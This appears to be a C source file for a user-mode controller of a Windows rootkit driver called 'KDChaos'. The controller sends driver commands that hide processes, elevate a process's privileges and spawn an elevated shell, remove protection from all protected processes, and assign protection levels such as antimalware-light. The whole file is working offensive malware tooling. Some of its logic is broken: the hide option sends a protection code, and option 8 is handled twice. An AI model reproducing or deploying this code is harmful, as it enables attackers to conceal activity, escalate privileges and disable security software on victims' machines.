#include <Windows.h>
#include <stdio.h>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)

int
isProcessRunning(
	int pid
)
{
	HANDLE phandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!phandle)
		return (-1);
	CloseHandle(phandle);
	return (0);

}

void printOptions() {
	printf("Protection level options:\n");
	printf("1. PS_PROTECTED_SYSTEM (0x72) - WinSystem (7) - Protected (2)\n");
	printf("2. PS_PROTECTED_WINTCB (0x62) - WinTcb (6) - Protected (2)\n");
	printf("3. PS_PROTECTED_WINDOWS (0x52) - Windows (5) - Protected (2)\n");
	printf("4. PS_PROTECTED_AUTHENTICODE (0x12) - Authenticode (1) - Protected (2)\n");
	printf("5. PS_PROTECTED_WINTCB_LIGHT (0x61) - WinTcb (6) - Protected Light (1)\n");
	printf("6. PS_PROTECTED_WINDOWS_LIGHT (0x51) - Windows (5) - Protected Light (1)\n");
	printf("7. PS_PROTECTED_LSA_LIGHT (0x41) - Lsa (4) - Protected Light (1)\n");
	printf("8. PS_PROTECTED_ANTIMALWARE_LIGHT (0x31) - Antimalware (3) - Protected Light (1)\n");
	printf("9. PS_PROTECTED_AUTHENTICODE_LIGHT (0x11) - Authenticode (1) - Protected Light (1)\n");
}

int
wmain(
	void
)
{
	int option, pid = 0;
	printf("1. Hide specific process\n2. Spawn an elevated process\n3. Elevate a specific process\n4. Unprotect All Processes\n5. Protect Specific Process\nPlease enter your choice: ");
	scanf_s("%d", &option);


	if (option == 1 || option == 3 || option == 5)
	{
		printf("Enter process ID (pid) :");
		scanf_s("%d", &pid);
	}
	else if (option == 2)
	{
		pid = GetCurrentProcessId();
	}
	else
	{
		if (option != 4)
		{
			printf("Invalid Option !\n");
			return (-1);
		}
	}

	DWORD lpBytesReturned;

	HANDLE hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hdevice == INVALID_HANDLE_VALUE)
	{
		printf("failed to open device\n");
		return (-1);
	}
	else
		printf("driver device opened\n");

	if (option == 1)
	{
		if (DeviceIoControl(hdevice, PROTECTION_LEVEL_ANTIMALWARE_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
			printf("IOCTL %x sent!\n", HIDE_PROC);
		else
		{
			printf("Failed to send the IOCTL %x.\n", HIDE_PROC);
			return (-1);
		}
		if (!lpBytesReturned)
		{
			printf("The process %d has been hidden.\n", pid);
		}
		else
		{
			if (!isProcessRunning(pid))
				printf("Failed to hide the process.\n");
			else
				printf("Invalid process ID (pid). Please make sure to provide a valid pid.\n");
			return (-1);
		}
	}
	if (option == 3 || option == 2)
	{
		if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
			printf("IOCTL %x sent!\n", PRIVILEGE_ELEVATION);
		else
		{
			printf("Failed to send the IOCTL %x.\n", PRIVILEGE_ELEVATION);
			return (-1);
		}
		if (!lpBytesReturned)
		{
			printf("The privilege of process %d has been elevated.\n", pid);
		}
		else
		{
			if (!isProcessRunning(pid))
				printf("Failed to elevate the process %d.\n", pid);
			else
				printf("Invalid process ID (pid). Please make sure to provide a valid pid.\n");
			return (-1);
		}
	}
	if (option == 4)
	{
		if (DeviceIoControl(hdevice, UNPROTECT_ALL_PROCESSES, NULL, NULL, &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
			printf("IOCTL %x sent!\n", UNPROTECT_ALL_PROCESSES);
		else
		{
			printf("Failed to send the IOCTL.\n");
			return (-1);
		}
		if (!lpBytesReturned)
		{
			printf("all processes protection has been removed.\n");
		}
	}
	if (option == 5)
	{
		int ElOption = 0;
		printOptions();

		printf("Enter option :");

		scanf_s("%d", &ElOption);

		if (ElOption <= 0 || ElOption >= 10)
		{
			printf("invalid provided option !!\n");
			return (-1);
		}
		if (ElOption == 1)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_SYSTEM, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_SYSTEM);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 2)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_WINTCB, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_WINTCB);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 3)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_WINDOWS, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_WINDOWS);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 4)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_AUTHENTICODE, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_AUTHENTICODE);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 5)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_WINTCB_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_WINTCB_LIGHT);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 6)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_WINDOWS_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_WINDOWS_LIGHT);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 7)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_LSA_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_LSA_LIGHT);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 8)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_ANTIMALWARE_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_ANTIMALWARE_LIGHT);
			else
				printf("Failed to send the IOCTL.\n");
		}
		if (ElOption == 8)
		{
			if (DeviceIoControl(hdevice, PROTECTION_LEVEL_AUTHENTICODE_LIGHT, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
				printf("IOCTL %x sent!\n", PROTECTION_LEVEL_AUTHENTICODE_LIGHT);
			else
				printf("Failed to send the IOCTL.\n");

		}
		if (!lpBytesReturned)
		{
			printf("The protection of process %d has been changed.\n", pid);
		}
	}
	if (pid == GetCurrentProcessId())
	{
		system("start");
		printf("Privileged process spawned successfully\n");
	}
	CloseHandle(hdevice);
	system("pause");
	return (0);
}
